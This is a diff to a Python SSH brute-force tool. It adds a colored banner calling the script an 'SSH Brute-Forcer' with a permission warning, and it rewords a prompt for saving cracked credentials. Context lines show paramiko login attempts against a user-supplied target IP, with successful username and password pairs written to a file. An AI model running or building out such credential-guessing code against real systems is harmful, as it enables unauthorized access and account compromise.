@@ -1,8 +1,23 @@
 import socket
 import paramiko
 import subprocess
+from colorama import init, Fore, Style
 
+# Initialize colorama
+init(autoreset=True)
 
+# Stylish introduction
+def print_intro():
+    intro_text = f"""
+{Fore.CYAN + Style.BRIGHT}Welcome to the SSH Brute-Forcer!
+{Fore.YELLOW + Style.NORMAL}-------------------------------------
+{Fore.GREEN}This tool will help you test SSH credentials against a target IP.
+{Fore.RED}!!!Ensure you have permission before proceeding!!!
+"""
+    print(intro_text)
+
+# Call the intro function
+print_intro()
 #The inputs for the script are the userlist and passlist paths and the target IP address.
 target_ip = input("your target IP:\n")
 # Function to send ping to the target IP address
@@ -50,7 +65,7 @@ def ssh(target_ip, username, password, port):
         return False
     else:
         print(f"Connection was successful {username} {password}")
-        credentials_path = input("Enter the path of the credentials file:\n")
+        credentials_path = input("Enter the path to save the credentials:\n")
         with open(credentials_path, "w") as credentials:
             credentials.write(f"{username}@{target_ip}:{password}\n")
             print(f"Credentials written to {credentials_path}")
